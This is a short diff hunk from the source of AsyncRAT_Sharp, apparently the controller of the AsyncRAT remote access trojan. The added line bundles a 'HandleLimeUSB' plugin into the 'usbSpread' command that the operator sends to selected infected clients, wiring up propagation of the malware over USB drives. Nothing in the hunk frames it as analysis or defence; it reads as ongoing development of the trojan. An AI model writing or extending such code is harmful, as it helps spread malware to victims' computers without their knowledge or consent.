@@ -851,6 +851,7 @@ namespace AsyncRAT_Sharp
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "usbSpread";
+                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.HandleLimeUSB);
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
